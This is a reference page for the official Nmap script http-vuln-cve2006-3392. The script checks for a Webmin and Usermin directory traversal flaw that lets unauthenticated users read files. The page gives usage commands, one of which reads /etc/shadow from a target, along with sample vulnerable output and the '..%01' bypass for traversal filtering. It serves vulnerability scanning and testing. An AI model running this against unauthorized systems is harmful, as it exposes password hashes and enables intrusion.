---
title: "http-vuln-cve2006-3392"
source: official
category: "Exploit"
categories:
  - "exploit"
  - "vuln"
  - "intrusive"
shortDescription: "Exploits a file disclosure vulnerability in Webmin (CVE-2006-3392)"
risk: intrusive
tags:
  - "exploit"
  - "vuln"
  - "intrusive"
  - "portrule"
scriptTypes:
  - "portrule"
protocols: []
ports: []
usage: "nmap -sV --script http-vuln-cve2006-3392 <target>\nnmap -p80 --script http-vuln-cve2006-3392 --script-args http-vuln-cve2006-3392.file=/etc/shadow <target>"
outputPreview:
  - "PORT   STATE SERVICE REASON"
  - "10000/tcp open  webmin    syn-ack"
  - "| http-vuln-cve2006-3392:"
  - "|   VULNERABLE:"
  - "|   Webmin File Disclosure"
  - "|     State: VULNERABLE (Exploitable)"
author: "Nmap Project"
reference:
  label: "View Official Script Source"
  url: "https://svn.nmap.org/nmap/scripts/http-vuln-cve2006-3392.nse"
documentationUrl: "https://nmap.org/nsedoc/scripts/http-vuln-cve2006-3392.html"
---

Exploits a file disclosure vulnerability in Webmin (CVE-2006-3392)
Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
to bypass the removal of "../" directory traversal sequences.
